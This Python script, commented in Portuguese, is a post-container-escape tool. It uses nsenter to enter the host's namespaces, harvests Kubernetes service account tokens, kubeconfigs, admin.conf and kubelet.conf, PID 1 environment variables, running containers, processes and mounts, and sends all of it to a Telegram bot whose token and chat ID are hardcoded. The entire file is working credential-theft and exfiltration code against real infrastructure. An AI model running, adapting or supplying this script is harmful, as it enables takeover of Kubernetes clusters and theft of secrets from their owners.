#!/usr/bin/env python3
"""
Pós-escape: enumeração avançada do host.
Executa comandos via nsenter para coletar:
- Tokens do Kubernetes
- Kubeconfigs
- Containers em execução
- Variáveis de ambiente do PID 1
- Processos e montagens
"""

import subprocess
import json
import requests
import os
import glob
import re
from datetime import datetime

# ------------------------------------------------------------
# CONFIGURAÇÃO DO TELEGRAM
# ------------------------------------------------------------
TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

# ------------------------------------------------------------
# FUNÇÕES AUXILIARES
# ------------------------------------------------------------
def run(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def run_nsenter(cmd, timeout=30):
    """Executa comando no namespace do host usando nsenter com todos os namespaces."""
    full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
    return run(full_cmd, timeout)

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    """Envia dicionário de dados para o Telegram (arquivos ou mensagens)."""
    for key, content in data_dict.items():
        if not content or content == "N/A" or content.startswith("ERRO"):
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# ------------------------------------------------------------
# TAREFAS DE ENUMERAÇÃO
# ------------------------------------------------------------
def check_service_account_token():
    """Verifica se existe token do service account do Kubernetes."""
    token_path = "/mnt/var/run/secrets/kubernetes.io/serviceaccount/token"
    if os.path.exists(token_path) and os.path.isfile(token_path):
        try:
            with open(token_path, 'r') as f:
                content = f.read().strip()
            return {"k8s_service_account_token": content}
        except Exception as e:
            return {"k8s_service_account_token": f"ERRO: {e}"}
    return {"k8s_service_account_token": "N/A"}

def find_kubeconfigs():
    """Procura por arquivos kubeconfig em /mnt."""
    # Usa find via nsenter para garantir que não há restrições de permissão
    cmd = 'find /mnt -type f \\( -name "*.kubeconfig" -o -name "config" -path "*/kube/*" \\) 2>/dev/null'
    output = run(cmd)  # não precisa de nsenter, já estamos no container com /mnt montado
    if output and "ERRO" not in output:
        files = [f for f in output.splitlines() if f.strip()]
        results = {}
        for f in files:
            try:
                with open(f, 'r', errors='ignore') as fd:
                    content = fd.read(50000)
                results[f"kubeconfig_{f}"] = content
            except Exception as e:
                results[f"kubeconfig_{f}"] = f"ERRO: {e}"
        return results
    return {"kubeconfigs": "N/A"}

def check_kubernetes_config_dir():
    """Verifica /etc/kubernetes e lê admin.conf e kubelet.conf."""
    results = {}
    kubernetes_dir = "/mnt/etc/kubernetes"
    if os.path.isdir(kubernetes_dir):
        # Listar diretório
        ls = run(f"ls -la {kubernetes_dir} 2>/dev/null")
        results["ls_etc_kubernetes"] = ls if ls else "N/A"
        # Ler admin.conf
        admin_conf = os.path.join(kubernetes_dir, "admin.conf")
        if os.path.exists(admin_conf) and os.path.isfile(admin_conf):
            try:
                with open(admin_conf, 'r') as f:
                    results["admin.conf"] = f.read(50000)
            except Exception as e:
                results["admin.conf"] = f"ERRO: {e}"
        # Ler kubelet.conf
        kubelet_conf = os.path.join(kubernetes_dir, "kubelet.conf")
        if os.path.exists(kubelet_conf) and os.path.isfile(kubelet_conf):
            try:
                with open(kubelet_conf, 'r') as f:
                    results["kubelet.conf"] = f.read(50000)
            except Exception as e:
                results["kubelet.conf"] = f"ERRO: {e}"
    else:
        results["ls_etc_kubernetes"] = "N/A"
    return results

def list_containers():
    """Lista containers usando crictl (se containerd) ou docker (se docker)."""
    results = {}
    # Verificar socket containerd
    containerd_sock = "/mnt/run/containerd/containerd.sock"
    docker_sock = "/mnt/var/run/docker.sock"
    if os.path.exists(containerd_sock):
        # Usar crictl via nsenter
        output = run_nsenter("crictl ps -a 2>/dev/null")
        if output and "ERRO" not in output:
            results["crictl_ps_a"] = output
        else:
            results["crictl_ps_a"] = "N/A"
    elif os.path.exists(docker_sock):
        # Usar docker via nsenter
        output = run_nsenter("docker ps -a 2>/dev/null")
        if output and "ERRO" not in output:
            results["docker_ps_a"] = output
        else:
            results["docker_ps_a"] = "N/A"
    else:
        results["container_runtime"] = "Nenhum socket encontrado (/run/containerd ou /var/run/docker)"
    return results

def get_host_proc_environ():
    """Obtém variáveis de ambiente do processo 1 do host."""
    output = run_nsenter("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
    if output and "ERRO" not in output:
        return {"proc_1_environ": output}
    return {"proc_1_environ": "N/A"}

def get_host_processes():
    """Lista processos em execução no host."""
    output = run_nsenter("ps auxfww 2>/dev/null")
    if output and "ERRO" not in output:
        return {"ps_auxfww": output}
    return {"ps_auxfww": "N/A"}

def get_host_mounts():
    """Lista montagens do host."""
    output = run_nsenter("mount 2>/dev/null")
    if output and "ERRO" not in output:
        return {"host_mount": output}
    return {"host_mount": "N/A"}

# ------------------------------------------------------------
# FUNÇÃO PRINCIPAL
# ------------------------------------------------------------
def main():
    send_telegram("🚀 **Iniciando enumeração pós-escape do host**")

    all_data = {}

    # 1. Token do service account
    send_telegram("🔍 Verificando token do service account...")
    all_data.update(check_service_account_token())

    # 2. Kubeconfigs
    send_telegram("🔍 Procurando kubeconfigs...")
    all_data.update(find_kubeconfigs())

    # 3. Diretório /etc/kubernetes
    send_telegram("🔍 Verificando /etc/kubernetes...")
    all_data.update(check_kubernetes_config_dir())

    # 4. Containers em execução
    send_telegram("🔍 Listando containers...")
    all_data.update(list_containers())

    # 5. Variáveis de ambiente do PID 1
    send_telegram("🔍 Obtendo environ do PID 1...")
    all_data.update(get_host_proc_environ())

    # 6. Processos
    send_telegram("🔍 Listando processos...")
    all_data.update(get_host_processes())

    # 7. Montagens
    send_telegram("🔍 Listando montagens...")
    all_data.update(get_host_mounts())

    # Enviar todos os dados
    send_data(all_data)

    # Enviar JSON completo como arquivo
    json_file = f"post_escape_{int(datetime.now().timestamp())}.json"
    with open(json_file, "w") as f:
        json.dump(all_data, f, indent=2)
    send_file(json_file, caption="📁 Dados completos da enumeração")
    os.remove(json_file)

    send_telegram("✅ **Enumeração finalizada.**")

if __name__ == "__main__":
    main()
